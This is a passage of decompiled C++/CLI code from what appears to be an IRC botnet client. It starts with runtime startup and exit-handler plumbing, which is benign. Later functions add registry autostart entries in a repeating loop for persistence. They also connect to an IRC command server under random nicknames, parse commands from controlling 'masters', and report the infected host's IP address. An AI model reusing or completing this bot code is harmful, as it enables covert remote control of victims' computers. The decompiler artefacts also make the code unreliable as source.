      Monitor.Enter(\u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_lock_Get());
      flag = true;
    }
    return flag;
  }

  [DebuggerStepThrough]
  [return: MarshalAs(UnmanagedType.U1)]
  internal static bool \u003FA0x11773762\u002E__global_unlock()
  {
    bool flag = false;
    if (\u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002EIsInitialized())
    {
      Monitor.Exit(\u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_lock_Get());
      flag = true;
    }
    return flag;
  }

  [DebuggerStepThrough]
  [return: MarshalAs(UnmanagedType.U1)]
  internal static bool \u003FA0x11773762\u002E__alloc_global_lock()
  {
    \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002EAddRef();
    return \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002EIsInitialized();
  }

  [DebuggerStepThrough]
  internal static void \u003FA0x11773762\u002E__dealloc_global_lock()
  {
    --\u003CModule\u003E.\u003F_ref_count\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0HA;
    if (\u003CModule\u003E.\u003F_ref_count\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0HA != 0)
      return;
    \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_lock_Destruct();
  }

  internal static unsafe int _atexit_helper(
    __FnPtr<void ()> func,
    uint* __pexit_list_size,
    __FnPtr<void ()>** __ponexitend_e,
    __FnPtr<void ()>** __ponexitbegin_e)
  {
    // ISSUE: cast to a function pointer type
    __FnPtr<void ()> local1 = (__FnPtr<void ()>) 0;
    if (func == null)
      return -1;
    int num1;
    if (\u003CModule\u003E.\u003FA0x11773762\u002E__global_lock())
    {
      try
      {
        __FnPtr<void ()>* local2 = (__FnPtr<void ()>*) \u003CModule\u003E._decode_pointer((void*) *(int*) __ponexitbegin_e);
        __FnPtr<void ()>* local3 = (__FnPtr<void ()>*) \u003CModule\u003E._decode_pointer((void*) *(int*) __ponexitend_e);
        __FnPtr<void ()>* local4 = (__FnPtr<void ()>*) ((IntPtr) local3 - (IntPtr) local2);
        if ((UIntPtr) ((int) *__pexit_list_size - 1) < (UIntPtr) local4 >> 2)
        {
          try
          {
            uint num2 = *__pexit_list_size * 4U;
            uint num3 = num2 >= 2048U ? 2048U : num2;
            IntPtr cb = new IntPtr((int) num2 + (int) num3);
            IntPtr num4 = Marshal.ReAllocHGlobal(new IntPtr((void*) local2), cb);
            local3 = (__FnPtr<void ()>*) ((IntPtr) num4.ToPointer() + (IntPtr) local4);
            local2 = (__FnPtr<void ()>*) num4.ToPointer();
            uint num5 = *__pexit_list_size;
            uint num6 = 512U >= num5 ? num5 : 512U;
            *__pexit_list_size = num5 + num6;
          }
          catch (OutOfMemoryException ex)
          {
            IntPtr cb = new IntPtr((int) *__pexit_list_size * 4 + 8);
            IntPtr num7 = Marshal.ReAllocHGlobal(new IntPtr((void*) local2), cb);
            local3 = (__FnPtr<void ()>*) ((IntPtr) num7.ToPointer() - (IntPtr) local2 + (IntPtr) local3);
            local2 = (__FnPtr<void ()>*) num7.ToPointer();
            uint* numPtr = __pexit_list_size;
            int num8 = (int) *numPtr + 4;
            *numPtr = (uint) num8;
          }
        }
        *(int*) local3 = (int) func;
        __FnPtr<void ()>* local5 = (__FnPtr<void ()>*) ((IntPtr) local3 + 4);
        local1 = func;
        *(int*) __ponexitbegin_e = (int) \u003CModule\u003E._encode_pointer((void*) local2);
        *(int*) __ponexitend_e = (int) \u003CModule\u003E._encode_pointer((void*) local5);
      }
      catch (OutOfMemoryException ex)
      {
      }
      finally
      {
        \u003CModule\u003E.\u003FA0x11773762\u002E__global_unlock();
      }
      if (local1 != null)
      {
        num1 = 0;
        goto label_12;
      }
    }
    num1 = -1;
label_12:
    return num1;
  }

  internal static unsafe void _exit_callback()
  {
    if (\u003CModule\u003E.\u003FA0x11773762\u002E__exit_list_size == 0U)
      return;
    __FnPtr<void ()>* local1 = (__FnPtr<void ()>*) \u003CModule\u003E._decode_pointer((void*) \u003CModule\u003E.\u003FA0x11773762\u002E__onexitbegin_m);
    __FnPtr<void ()>* local2 = (__FnPtr<void ()>*) \u003CModule\u003E._decode_pointer((void*) \u003CModule\u003E.\u003FA0x11773762\u002E__onexitend_m);
    if ((IntPtr) local1 != new IntPtr(-1) && (IntPtr) local1 != IntPtr.Zero && (IntPtr) local2 != IntPtr.Zero)
    {
      __FnPtr<void ()>* local3 = local1;
      __FnPtr<void ()>* local4 = local2;
      while (true)
      {
        __FnPtr<void ()>* local5;
        __FnPtr<void ()>* local6;
        do
        {
          do
          {
            local2 -= 4;
            if (local2 < local1)
              goto label_7;
          }
          while ((IntPtr) *(int*) local2 == (IntPtr) \u003CModule\u003E._encoded_null());
          void* voidPtr = \u003CModule\u003E._decode_pointer((void*) *(int*) local2);
          *(int*) local2 = (int) \u003CModule\u003E._encoded_null();
          // ISSUE: cast to a function pointer type
          // ISSUE: function pointer call
          __calli((__FnPtr<void ()>) (IntPtr) voidPtr)();
          local5 = (__FnPtr<void ()>*) \u003CModule\u003E._decode_pointer((void*) \u003CModule\u003E.\u003FA0x11773762\u002E__onexitbegin_m);
          local6 = (__FnPtr<void ()>*) \u003CModule\u003E._decode_pointer((void*) \u003CModule\u003E.\u003FA0x11773762\u002E__onexitend_m);
        }
        while (local3 == local5 && local4 == local6);
        local3 = local5;
        local1 = local5;
        local4 = local6;
        local2 = local6;
      }
label_7:
      Marshal.FreeHGlobal(new IntPtr((void*) local1));
    }
    \u003CModule\u003E.\u003FA0x11773762\u002E__dealloc_global_lock();
  }

  [DebuggerStepThrough]
  internal static unsafe int _initatexit_m()
  {
    if (!\u003CModule\u003E.\u003FA0x11773762\u002E__alloc_global_lock())
      return 0;
    \u003CModule\u003E.\u003FA0x11773762\u002E__onexitbegin_m = (__FnPtr<void ()>*) \u003CModule\u003E._encode_pointer(Marshal.AllocHGlobal(128).ToPointer());
    \u003CModule\u003E.\u003FA0x11773762\u002E__onexitend_m = \u003CModule\u003E.\u003FA0x11773762\u002E__onexitbegin_m;
    \u003CModule\u003E.\u003FA0x11773762\u002E__exit_list_size = 32U;
    return 1;
  }

  internal static __FnPtr<int ()> _onexit_m(__FnPtr<int ()> _Function) => \u003CModule\u003E._atexit_m((__FnPtr<void ()>) _Function) != -1 ? _Function : (__FnPtr<int ()>) 0;

  internal static unsafe int _atexit_m(__FnPtr<void ()> func) => \u003CModule\u003E._atexit_helper((__FnPtr<void ()>) (IntPtr) \u003CModule\u003E._encode_pointer((void*) func), &\u003CModule\u003E.\u003FA0x11773762\u002E__exit_list_size, &\u003CModule\u003E.\u003FA0x11773762\u002E__onexitend_m, &\u003CModule\u003E.\u003FA0x11773762\u002E__onexitbegin_m);

  [DebuggerStepThrough]
  internal static unsafe int _initatexit_app_domain()
  {
    if (\u003CModule\u003E.\u003FA0x11773762\u002E__alloc_global_lock())
    {
      \u003CModule\u003E.__onexitbegin_app_domain = (__FnPtr<void ()>*) \u003CModule\u003E._encode_pointer(Marshal.AllocHGlobal(128).ToPointer());
      \u003CModule\u003E.__onexitend_app_domain = \u003CModule\u003E.__onexitbegin_app_domain;
      \u003CModule\u003E.__exit_list_size_app_domain = 32U;
    }
    return 1;
  }

  internal static unsafe void _app_exit_callback()
  {
    if (\u003CModule\u003E.__exit_list_size_app_domain == 0U)
      return;
    __FnPtr<void ()>* local1 = (__FnPtr<void ()>*) \u003CModule\u003E._decode_pointer((void*) \u003CModule\u003E.__onexitbegin_app_domain);
    __FnPtr<void ()>* local2 = (__FnPtr<void ()>*) \u003CModule\u003E._decode_pointer((void*) \u003CModule\u003E.__onexitend_app_domain);
    try
    {
      if ((IntPtr) local1 == new IntPtr(-1) || (IntPtr) local1 == IntPtr.Zero || (IntPtr) local2 == IntPtr.Zero)
        return;
      __FnPtr<void ()>* local3 = local1;
      __FnPtr<void ()>* local4 = local2;
      while (true)
      {
        __FnPtr<void ()>* local5;
        __FnPtr<void ()>* local6;
        do
        {
          do
          {
            local2 -= 4;
          }
          while (local2 >= local1 && (IntPtr) *(int*) local2 == (IntPtr) \u003CModule\u003E._encoded_null());
          if (local2 >= local1)
          {
            // ISSUE: cast to a function pointer type
            __FnPtr<void ()> local7 = (__FnPtr<void ()>) (IntPtr) \u003CModule\u003E._decode_pointer((void*) *(int*) local2);
            *(int*) local2 = (int) \u003CModule\u003E._encoded_null();
            // ISSUE: function pointer call
            __calli(local7)();
            local5 = (__FnPtr<void ()>*) \u003CModule\u003E._decode_pointer((void*) \u003CModule\u003E.__onexitbegin_app_domain);
            local6 = (__FnPtr<void ()>*) \u003CModule\u003E._decode_pointer((void*) \u003CModule\u003E.__onexitend_app_domain);
          }
          else
            goto label_12;
        }
        while (local3 == local5 && local4 == local6);
        local3 = local5;
        local1 = local5;
        local4 = local6;
        local2 = local6;
      }
label_12:;
    }
    finally
    {
      Marshal.FreeHGlobal(new IntPtr((void*) local1));
      \u003CModule\u003E.\u003FA0x11773762\u002E__dealloc_global_lock();
    }
  }

  internal static __FnPtr<int ()> _onexit_m_appdomain(__FnPtr<int ()> _Function) => \u003CModule\u003E._atexit_m_appdomain((__FnPtr<void ()>) _Function) != -1 ? _Function : (__FnPtr<int ()>) 0;

  [DebuggerStepThrough]
  internal static unsafe int _atexit_m_appdomain(__FnPtr<void ()> func) => \u003CModule\u003E._atexit_helper((__FnPtr<void ()>) (IntPtr) \u003CModule\u003E._encode_pointer((void*) func), &\u003CModule\u003E.__exit_list_size_app_domain, &\u003CModule\u003E.__onexitend_app_domain, &\u003CModule\u003E.__onexitbegin_app_domain);

  [DebuggerStepThrough]
  internal static unsafe int _initterm_e(__FnPtr<int ()>* pfbegin, __FnPtr<int ()>* pfend)
  {
    int num1 = 0;
    if (pfbegin < pfend)
    {
      while (num1 == 0)
      {
        uint num2 = (uint) *(int*) pfbegin;
        if (num2 != 0U)
        {
          // ISSUE: cast to a function pointer type
          // ISSUE: function pointer call
          num1 = __calli((__FnPtr<int ()>) (int) num2)();
        }
        pfbegin += 4;
        if (pfbegin >= pfend)
          break;
      }
    }
    return num1;
  }

  [DebuggerStepThrough]
  internal static unsafe void _initterm(__FnPtr<void ()>* pfbegin, __FnPtr<void ()>* pfend)
  {
    if (pfbegin >= pfend)
      return;
    do
    {
      uint num = (uint) *(int*) pfbegin;
      if (num != 0U)
      {
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        __calli((__FnPtr<void ()>) (int) num)();
      }
      pfbegin += 4;
    }
    while (pfbegin < pfend);
  }

  [DebuggerStepThrough]
  internal static ModuleHandle \u003CCrtImplementationDetails\u003E\u002EThisModule\u002EHandle() => typeof (ThisModule).Module.ModuleHandle;

  [DebuggerStepThrough]
  internal static unsafe void _initterm_m(__FnPtr<void* ()>* pfbegin, __FnPtr<void* ()>* pfend)
  {
    if (pfbegin >= pfend)
      return;
    do
    {
      uint methodToken = (uint) *(int*) pfbegin;
      if (methodToken != 0U)
      {
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        void* voidPtr = __calli(\u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EThisModule\u002EResolveMethod\u003Cvoid\u0020const\u0020\u002A\u0020__clrcall\u0028void\u0029\u003E((__FnPtr<void* ()>) (int) methodToken))();
      }
      pfbegin += 4;
    }
    while (pfbegin < pfend);
  }

  [DebuggerStepThrough]
  internal static unsafe __FnPtr<void* ()> \u003CCrtImplementationDetails\u003E\u002EThisModule\u002EResolveMethod\u003Cvoid\u0020const\u0020\u002A\u0020__clrcall\u0028void\u0029\u003E(
    __FnPtr<void* ()> methodToken)
  {
    // ISSUE: cast to a function pointer type
    return (__FnPtr<void* ()>) (IntPtr) \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EThisModule\u002EHandle().ResolveMethodHandle((int) methodToken).GetFunctionPointer().ToPointer();
  }

  [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
  internal static unsafe void ___CxxCallUnwindDtor(__FnPtr<void (void*)> pDtor, void* pThis)
  {
    try
    {
      void* voidPtr = pThis;
      // ISSUE: function pointer call
      __calli(pDtor)(voidPtr);
    }
    catch (Exception ex) when (\u003CModule\u003E.__FrameUnwindFilter((_EXCEPTION_POINTERS*) Marshal.GetExceptionPointers()) != 0)
    {
    }
  }

  [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
  internal static unsafe void ___CxxCallUnwindDelDtor(__FnPtr<void (void*)> pDtor, void* pThis)
  {
    try
    {
      void* voidPtr = pThis;
      // ISSUE: function pointer call
      __calli(pDtor)(voidPtr);
    }
    catch (Exception ex) when (\u003CModule\u003E.__FrameUnwindFilter((_EXCEPTION_POINTERS*) Marshal.GetExceptionPointers()) != 0)
    {
    }
  }

  [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
  internal static unsafe void ___CxxCallUnwindVecDtor(
    __FnPtr<void (void*, uint, int, __FnPtr<void (void*)>)> pVecDtor,
    void* ptr,
    uint size,
    int count,
    __FnPtr<void (void*)> pDtor)
  {
    try
    {
      void* voidPtr = ptr;
      int num1 = (int) size;
      int num2 = count;
      __FnPtr<void (void*)> local = pDtor;
      // ISSUE: cast to a function pointer type
      // ISSUE: function pointer call
      __calli(pVecDtor)((__FnPtr<void (void*)>) (IntPtr) voidPtr, num1, (uint) num2, (void*) local);
    }
    catch (Exception ex) when (\u003CModule\u003E.__FrameUnwindFilter((_EXCEPTION_POINTERS*) Marshal.GetExceptionPointers()) != 0)
    {
    }
  }

  internal static unsafe void currentIP(uint sock, sbyte* chan, int notice, int threadnum)
  {
    \u0024ArrayType\u0024\u0024\u0024BY0CAA\u0040D arrayTypeBy0CaaD;
    if (\u003CModule\u003E.findthreadid(7) > 0)
    {
      in_addr inAddr1;
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(int&) ref inAddr1 = ^(int&) (threadnum * 8 + (IntPtr) &\u003CModule\u003E.advinfo);
      ref \u0024ArrayType\u0024\u0024\u0024BY0CAA\u0040D local1 = ref arrayTypeBy0CaaD;
      ref \u0024ArrayType\u0024\u0024\u0024BY0BI\u0040\u0024\u0024CBD local2 = ref \u003CModule\u003E.\u003FA0x1755acad\u002Eunnamed\u002Dglobal\u002D0;
      in_addr inAddr2 = inAddr1;
      // ISSUE: function pointer call
      sbyte* numPtr = __calli(\u003CModule\u003E.finet_ntoa)(inAddr2);
      \u003CModule\u003E.sprintf((sbyte*) ref local1, (sbyte*) ref local2, __arglist ((IntPtr) numPtr));
    }
    else
      \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0CaaD, (sbyte*) &\u003CModule\u003E.\u003FA0x1755acad\u002Eunnamed\u002Dglobal\u002D1, __arglist ());
    \u003CModule\u003E.irc_privmsg(sock, chan, (sbyte*) &arrayTypeBy0CaaD, notice, 0);
  }

  internal static int HandlerRoutine(uint dwCtrlType) => dwCtrlType > 2U ? 0 : 1;

  internal static unsafe void OpenConsole()
  {
    \u003CModule\u003E.AllocConsole();
    _iobuf* iobufPtr1 = \u003CModule\u003E._fdopen(\u003CModule\u003E._open_osfhandle((int) \u003CModule\u003E.GetStdHandle(4294967285U), 16384), (sbyte*) &\u003CModule\u003E.\u003FA0xc43c8710\u002Eunnamed\u002Dglobal\u002D0);
    // ISSUE: cpblk instruction
    __memcpy((IntPtr) \u003CModule\u003E.__iob_func() + 32, (IntPtr) iobufPtr1, 32);
    \u003CModule\u003E.setvbuf((_iobuf*) ((IntPtr) \u003CModule\u003E.__iob_func() + 32), (sbyte*) 0, 4, 0U);
    _iobuf* iobufPtr2 = \u003CModule\u003E._fdopen(\u003CModule\u003E._open_osfhandle((int) \u003CModule\u003E.GetStdHandle(4294967284U), 16384), (sbyte*) &\u003CModule\u003E.\u003FA0xc43c8710\u002Eunnamed\u002Dglobal\u002D1);
    // ISSUE: cpblk instruction
    __memcpy((IntPtr) \u003CModule\u003E.__iob_func() + 64, (IntPtr) iobufPtr2, 32);
    \u003CModule\u003E.setvbuf((_iobuf*) ((IntPtr) \u003CModule\u003E.__iob_func() + 32), (sbyte*) 0, 4, 0U);
    // ISSUE: cast to a function pointer type
    \u003CModule\u003E.SetConsoleCtrlHandler((__FnPtr<int (uint)>) (IntPtr) \u003CModule\u003E.__unep\u0040\u003FHandlerRoutine\u0040\u0040\u0024\u0024FYGHK\u0040Z, 1);
  }

  internal static unsafe void AutoStartRegister(char* nfilename)
  {
    HKEY__* hkeyPtr1 = (HKEY__*) 0;
    int num1 = 0;
    do
    {
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      int num2 = ^(int&) (num1 + (IntPtr) &\u003CModule\u003E.autostart);
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      int num3 = ^(int&) (num1 + ((IntPtr) &\u003CModule\u003E.autostart + 4));
      ref HKEY__* local1 = ref hkeyPtr1;
      // ISSUE: function pointer call
      int num4 = __calli(\u003CModule\u003E.fRegCreateKeyEx)((uint*) num2, (HKEY__**) num3, (_SECURITY_ATTRIBUTES*) 0, 0U, 0U, (char*) 983103, 0U, (char*) ref local1, (HKEY__*) 0);
      if ((IntPtr) nfilename != IntPtr.Zero)
      {
        nfilename = (char*) &\u003CModule\u003E.\u003FA0xb9b13019\u002Eunnamed\u002Dglobal\u002D0;
        \u003CModule\u003E.printf((sbyte*) &\u003CModule\u003E.\u003FA0xb9b13019\u002Eunnamed\u002Dglobal\u002D1, __arglist ((int) \u003CModule\u003E.wcslen((char*) &\u003CModule\u003E.\u003FA0xb9b13019\u002Eunnamed\u002Dglobal\u002D0) * 2 + 2));
        HKEY__* hkeyPtr2 = hkeyPtr1;
        ref \u0024ArrayType\u0024\u0024\u0024BY0O\u0040_W local2 = ref \u003CModule\u003E.valuename;
        ref \u0024ArrayType\u0024\u0024\u0024BY0O\u0040\u0024\u0024CB_W local3 = ref \u003CModule\u003E.\u003FA0xb9b13019\u002Eunnamed\u002Dglobal\u002D0;
        int num5 = (int) \u003CModule\u003E.wcslen((char*) &\u003CModule\u003E.\u003FA0xb9b13019\u002Eunnamed\u002Dglobal\u002D0) << 1;
        // ISSUE: function pointer call
        int num6 = __calli(\u003CModule\u003E.fRegSetValueEx)((uint) hkeyPtr2, (byte*) ref local2, 0U, 2U, (char*) ref local3, (HKEY__*) num5);
      }
      else
      {
        HKEY__* hkeyPtr3 = hkeyPtr1;
        ref \u0024ArrayType\u0024\u0024\u0024BY0O\u0040_W local4 = ref \u003CModule\u003E.valuename;
        // ISSUE: function pointer call
        int num7 = __calli(\u003CModule\u003E.fRegDeleteValue)((char*) hkeyPtr3, (HKEY__*) ref local4);
      }
      HKEY__* hkeyPtr4 = hkeyPtr1;
      // ISSUE: function pointer call
      int num8 = __calli(\u003CModule\u003E.fRegCloseKey)(hkeyPtr4);
      num1 += 8;
    }
    while ((uint) num1 < 24U);
  }

  internal static unsafe uint AutoRegistry(void* param)
  {
    while (true)
    {
      \u003CModule\u003E.AutoStartRegister((char*) param);
      \u003CModule\u003E.Sleep(72000U);
    }
  }

  internal static unsafe sbyte* strchr(sbyte* _Str, int _Ch) => \u003CModule\u003E.strchr(_Str, _Ch);

  internal static unsafe sbyte* strstr(sbyte* _Str, sbyte* _SubStr) => \u003CModule\u003E.strstr(_Str, _SubStr);

  internal static unsafe int CopyFile(
    char* lpExistingFileName,
    char* lpNewFileName,
    int bFailIfExists)
  {
    return \u003CModule\u003E.CopyFileW(lpExistingFileName, lpNewFileName, bFailIfExists);
  }

  internal static unsafe int IsInSystemDir(char* filename, char* sysdir) => 0;

  internal static unsafe uint irc_connect(void* param)
  {
    IRC irc;
    // ISSUE: cpblk instruction
    __memcpy(ref irc, (IntPtr) param, 356);
    *(int*) ((IntPtr) param + 352) = 1;
    sockaddr_in sockaddrIn;
    \u003CModule\u003E.memset((void*) &sockaddrIn, 0, 16U);
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(short&) ref sockaddrIn = (short) 2;
    // ISSUE: cast to a reference type
    ref sockaddr_in local1 = (sockaddr_in&) ((IntPtr) &sockaddrIn + 2);
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    int num1 = (int) (ushort) ^(int&) ((IntPtr) &irc + 340);
    // ISSUE: function pointer call
    int num2 = (int) __calli(\u003CModule\u003E.fhtons)((ushort) num1);
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(short&) ref local1 = (short) num2;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &sockaddrIn + 4) = (int) \u003CModule\u003E.ResolveAddress((sbyte*) ((IntPtr) &irc + 4));
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    if (^(int&) ((IntPtr) &sockaddrIn + 4) != 0)
    {
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      do
      {
        \u0024ArrayType\u0024\u0024\u0024BY0BM\u0040D arrayTypeBy0BmD;
        \u003CModule\u003E.memset((void*) &arrayTypeBy0BmD, 0, 28U);
        sbyte* nick1 = \u003CModule\u003E.rndnick((sbyte*) &arrayTypeBy0BmD, 2, 1, (sbyte*) 0);
        // ISSUE: function pointer call
        uint sock = __calli(\u003CModule\u003E.fsocket)(2, 1, 6);
        int num3 = (int) sock;
        ref sockaddr_in local2 = ref sockaddrIn;
        // ISSUE: function pointer call
        if (__calli(\u003CModule\u003E.fconnect)(num3, (sockaddr*) ref local2, 16U) == -1)
        {
          int num4 = (int) sock;
          // ISSUE: function pointer call
          int num5 = __calli(\u003CModule\u003E.fclosesocket)((uint) num4);
          \u003CModule\u003E.FlushDNSCache();
          \u003CModule\u003E.Sleep(2000U);
          // ISSUE: cast to a reference type
          \u003CModule\u003E.printf((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D11, __arglist ((IRC&) ((IntPtr) &irc + 4)));
        }
        else
        {
          // ISSUE: cast to a reference type
          \u003CModule\u003E.printf((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D12, __arglist ((IRC&) ((IntPtr) &irc + 4)));
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          int num6 = \u003CModule\u003E.irc_receiveloop(sock, (sbyte*) ((IntPtr) &irc + 132), (sbyte*) ((IntPtr) &irc + 196), nick1, (uint) ^(int&) ref irc, (sbyte*) ((IntPtr) &irc + 260), (sbyte*) ((IntPtr) &irc + 4), ^(int&) ((IntPtr) &irc + 344));
          int num7 = (int) sock;
          // ISSUE: function pointer call
          int num8 = __calli(\u003CModule\u003E.fclosesocket)((uint) num7);
          switch (num6)
          {
            case 1:
              \u003CModule\u003E.Sleep(960000U);
              break;
            case 2:
              goto label_7;
          }
        }
        \u003CModule\u003E.memset((void*) &sockaddrIn, 0, 16U);
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(short&) ref sockaddrIn = (short) 2;
        // ISSUE: cast to a reference type
        ref sockaddr_in local3 = (sockaddr_in&) ((IntPtr) &sockaddrIn + 2);
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        int num9 = (int) (ushort) ^(int&) ((IntPtr) &irc + 340);
        // ISSUE: function pointer call
        int num10 = (int) __calli(\u003CModule\u003E.fhtons)((ushort) num9);
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(short&) ref local3 = (short) num10;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ((IntPtr) &sockaddrIn + 4) = (int) \u003CModule\u003E.ResolveAddress((sbyte*) ((IntPtr) &irc + 4));
      }
      while (^(int&) ((IntPtr) &sockaddrIn + 4) != 0);
      goto label_6;
label_7:
      return 2;
    }
label_6:
    return 0;
  }

  internal static unsafe int irc_receiveloop(
    uint sock,
    sbyte* channel,
    sbyte* chanpass,
    sbyte* nick1,
    uint hsock,
    sbyte* hchannel,
    sbyte* server,
    int spy)
  {
    int num1 = 0;
    \u0024ArrayType\u0024\u0024\u0024BY10IA\u0040D arrayTypeBy10IaD;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(sbyte&) ref arrayTypeBy10IaD = (sbyte) 0;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    if (^(sbyte&) ref \u003CModule\u003E.serverpass != (sbyte) 0)
      \u003CModule\u003E.irc_sendv(sock, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D13, __arglist (out \u003CModule\u003E.serverpass));
    \u0024ArrayType\u0024\u0024\u0024BY0IA\u0040D arrayTypeBy0IaD;
    \u0024ArrayType\u0024\u0024\u0024BY0BC\u0040D arrayTypeBy0BcD;
    \u003CModule\u003E.sprintf((sbyte*) &arrayTypeBy0IaD, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D14, __arglist ((IntPtr) nick1, (IntPtr) \u003CModule\u003E.rndnick((sbyte*) &arrayTypeBy0BcD, 2, 0, (sbyte*) 0), (IntPtr) nick1));
    int num2 = (int) sock;
    ref \u0024ArrayType\u0024\u0024\u0024BY0IA\u0040D local1 = ref arrayTypeBy0IaD;
    int num3 = (int) \u003CModule\u003E.strlen((sbyte*) &arrayTypeBy0IaD);
    // ISSUE: function pointer call
    if (__calli(\u003CModule\u003E.fsend)(num2, (int) ref local1, (sbyte*) num3, 0U) == -1)
    {
      int num4 = (int) sock;
      // ISSUE: function pointer call
      int num5 = __calli(\u003CModule\u003E.fclosesocket)((uint) num4);
      \u003CModule\u003E.Sleep(5000U);
      return 0;
    }
    \u0024ArrayType\u0024\u0024\u0024BY0BAAA\u0040D arrayTypeBy0BaaaD;
    \u003CModule\u003E.memset((void*) &arrayTypeBy0BaaaD, 0, 4096U);
    int num6 = (int) sock;
    ref \u0024ArrayType\u0024\u0024\u0024BY0BAAA\u0040D local2 = ref arrayTypeBy0BaaaD;
    // ISSUE: function pointer call
    if (__calli(\u003CModule\u003E.frecv)(num6, (int) ref local2, (sbyte*) 4096, 0U) > 0)
    {
      int num7;
      // ISSUE: variable of a reference type
      \u0024ArrayType\u0024\u0024\u0024BY0BAAA\u0040D& local3;
      // ISSUE: function pointer call
      do
      {
        \u0024ArrayType\u0024\u0024\u0024BY0CAA\u0040PAD arrayTypeBy0CaaPad;
        int num8 = \u003CModule\u003E.Split((sbyte*) &arrayTypeBy0BaaaD, (void*) &arrayTypeBy0CaaPad);
        int num9 = 0;
        if (0 < num8)
        {
          sbyte** numPtr = (sbyte**) &arrayTypeBy0CaaPad;
          do
          {
            int repeat = 1;
            while (true)
            {
              \u0024ArrayType\u0024\u0024\u0024BY0KA\u0040D arrayTypeBy0KaD;
              repeat = \u003CModule\u003E.irc_parseline((sbyte*) *(int*) numPtr, sock, channel, chanpass, nick1, server, (\u0024ArrayType\u0024\u0024\u0024BY0IA\u0040D*) &arrayTypeBy10IaD, (sbyte*) &arrayTypeBy0KaD, &num1, repeat, spy) - 1;
              if (repeat > 0)
                \u003CModule\u003E.Sleep(2000U);
              else
                break;
            }
            switch (repeat)
            {
              case -3:
                goto label_16;
              case -2:
                goto label_15;
              case -1:
                goto label_14;
              default:
                ++num9;
                numPtr += 4;
                continue;
            }
          }
          while (num9 < num8);
        }
        \u003CModule\u003E.memset((void*) &arrayTypeBy0BaaaD, 0, 4096U);
        num7 = (int) sock;
        local3 = ref arrayTypeBy0BaaaD;
      }
      while (__calli(\u003CModule\u003E.frecv)(num7, (int) ref local3, (sbyte*) 4096, 0U) > 0);
      goto label_13;
label_14:
      return 0;
label_15:
      return 1;
label_16:
      return 2;
    }
label_13:
    return 0;
  }

  internal static unsafe int irc_parseline(
    sbyte* line,
    uint sock,
    sbyte* channel,
    sbyte* chanpass,
    sbyte* nick1,
    sbyte* server,
    \u0024ArrayType\u0024\u0024\u0024BY0IA\u0040D* masters,
    sbyte* host,
    int* in_channel,
    int repeat,
    int spy)
  {
    \u003CModule\u003E.printf((sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D15, __arglist ((IntPtr) line));
    int num1 = 3;
    uint num2 = 0;
    int num3 = 0;
    int silent = 0;
    int notice = 0;
    int num4 = 0;
    \u0024ArrayType\u0024\u0024\u0024BY0CAA\u0040D arrayTypeBy0CaaD1;
    \u003CModule\u003E.memset((void*) &arrayTypeBy0CaaD1, 0, 512U);
    \u0024ArrayType\u0024\u0024\u0024BY0BM\u0040D arrayTypeBy0BmD;
    \u003CModule\u003E.strncpy((sbyte*) &arrayTypeBy0BmD, nick1, 27U);
    if ((IntPtr) line == IntPtr.Zero)
      return 1;
    \u0024ArrayType\u0024\u0024\u0024BY0CAA\u0040D arrayTypeBy0CaaD2;
    \u003CModule\u003E.memset((void*) &arrayTypeBy0CaaD2, 0, 512U);
    \u003CModule\u003E.strncpy((sbyte*) &arrayTypeBy0CaaD2, line, 511U);
    sbyte* _Str = \u003CModule\u003E.strstr((sbyte*) &arrayTypeBy0CaaD2, (sbyte*) &\u003CModule\u003E.\u003FA0xc00eb828\u002Eunnamed\u002Dglobal\u002D16);
    \u0024ArrayType\u0024\u0024\u0024BY0CAA\u0040D arrayTypeBy0CaaD3;
    \u003CModule\u003E.strncpy((sbyte*) &arrayTypeBy0CaaD3, (sbyte*) &arrayTypeBy0CaaD2, 511U);
    \u0024ArrayType\u0024\u0024\u0024BY0CA\u0040PAD arrayTypeBy0CaPad;
